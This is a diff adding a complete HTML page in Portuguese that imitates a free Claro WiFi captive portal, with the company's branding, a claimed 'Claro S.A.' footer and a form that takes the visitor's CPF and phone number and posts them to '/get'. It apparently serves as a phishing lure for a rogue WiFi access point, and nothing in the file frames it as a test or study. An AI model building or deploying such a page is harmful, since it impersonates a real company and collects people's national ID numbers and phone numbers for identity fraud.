@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Claro - WiFi Gratuito</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: linear-gradient(135deg, #da291c 0%, #9e1a13 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .container {
+            background: white;
+            border-radius: 12px;
+            padding: 40px;
+            width: 90%;
+            max-width: 400px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo h1 {
+            color: #da291c;
+            font-size: 48px;
+            font-weight: bold;
+        }
+
+        .logo p {
+            color: #333;
+            font-size: 18px;
+            margin-top: 10px;
+        }
+
+        .wifi-icon {
+            font-size: 60px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .info {
+            background: #f0f0f0;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .info p {
+            color: #666;
+            font-size: 14px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #da291c;
+        }
+
+        button {
+            width: 100%;
+            padding: 16px;
+            background: #da291c;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        button:hover {
+            background: #b82318;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 11px;
+            color: #999;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="logo">
+            <h1>claro</h1>
+        </div>
+        <div class="wifi-icon">📶</div>
+        <div class="info">
+            <p><strong>WiFi Claro Gratuito</strong></p>
+            <p>Navegue com velocidade 4G+ por 2 horas</p>
+        </div>
+        <form action="/get" method="POST">
+            <div class="form-group">
+                <label>CPF (apenas números)</label>
+                <input type="text" name="cpf" placeholder="00000000000" maxlength="11" required>
+            </div>
+            <div class="form-group">
+                <label>Seu telefone Claro</label>
+                <input type="tel" name="telefone" placeholder="(00) 00000-0000" required>
+            </div>
+            <button type="submit">Conectar Grátis</button>
+        </form>
+        <div class="footer">
+            Claro S.A. - Ao continuar você aceita os termos de uso
+        </div>
+    </div>
+</body>
+
+</html>
